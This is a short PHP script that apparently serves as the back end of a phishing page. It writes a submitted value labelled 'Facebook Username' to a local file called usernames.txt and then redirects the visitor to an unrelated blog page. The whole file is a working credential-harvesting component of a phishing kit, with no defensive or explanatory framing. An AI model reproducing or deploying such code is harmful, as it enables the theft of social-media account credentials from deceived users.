<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username']."\n", FILE_APPEND);
header('Location: https://mahfuzphero.github.io/blogging-page-2/');
exit();
?>